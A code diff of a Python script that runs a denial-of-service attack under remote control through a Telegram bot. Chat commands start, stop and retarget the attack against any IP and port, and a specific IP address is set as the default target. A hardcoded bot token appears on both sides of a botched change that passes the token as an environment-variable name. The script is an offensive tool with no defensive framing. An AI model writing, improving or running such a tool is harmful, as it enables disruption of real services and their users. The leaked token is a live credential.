@@ -3,7 +3,6 @@ from scapy.all import *
 from threading import Thread
 import time
 import os
-import subprocess
 
 class DDoSAttack:
     def __init__(self, ip, port):
@@ -24,7 +23,7 @@ class DDoSAttack:
         self.port = new_port
 
 def telegram_bot_start():
-    bot_api_key = "8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"
+    bot_api_key = os.environ["8625781811:AAGymdn1JBdoOj2aba1kpmz9vebH9k3Q0Ko"]
     bot_url = f"https://api.telegram.org/bot{bot_api_key}/"
 
     # Handle commands
@@ -45,23 +44,29 @@ def telegram_bot_start():
                 command_text = command["message"]["text"].split()
                 if command_text[0] == "/start":
                     send_message(chat_id, "DDoS Bot started. Type /help for commands.")
+                    time.sleep(1)  # Delay between sending messages
                 elif command_text[0] == "/help":
                     send_message(chat_id, "Available commands: /start, /attack, /stop, /change")
+                    time.sleep(1)  # Delay between sending messages
                 elif command_text[0] == "/attack":
                     ddos_attack.start_attack()
                     send_message(chat_id, "Attack started.")
+                    time.sleep(1)  # Delay between sending messages
                 elif command_text[0] == "/stop":
                     ddos_attack.stop_attack()
                     send_message(chat_id, "Attack stopped.")
+                    time.sleep(1)  # Delay between sending messages
                 elif command_text[0] == "/change":
                     try:
                         new_ip = command_text[1]
                         new_port = int(command_text[2])
                         ddos_attack.change_target(new_ip, new_port)
                         send_message(chat_id, f"Target changed to {new_ip}:{new_port}")
+                        time.sleep(1)  # Delay between sending messages
                     except (IndexError, ValueError):
                         send_message(chat_id, "Invalid command. Use /change <new_ip> <new_port>")
-        time.sleep(1)
+                        time.sleep(1)  # Delay between sending messages
+        time.sleep(1)  # Delay between checking for new messages
 
 if __name__ == "__main__":
     ip = "20.219.163.225"
